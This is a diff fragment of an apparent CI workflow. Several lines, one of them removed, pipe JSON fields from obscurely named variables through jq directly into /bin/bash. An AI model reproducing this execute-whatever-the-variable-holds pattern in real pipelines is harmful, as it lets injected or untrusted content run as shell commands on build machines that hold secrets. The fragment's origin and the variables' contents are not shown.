@@ -35,7 +35,6 @@ jobs:
           echo $vw0570 | jq -r .opqr8198 | /bin/bash
           printf '%s' "$xhxl31746" | jq -r .lyz50 | /bin/bash
           echo $s2 | jq -r .p42 | /bin/bash
-          echo $crno89 | jq -r .q7 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
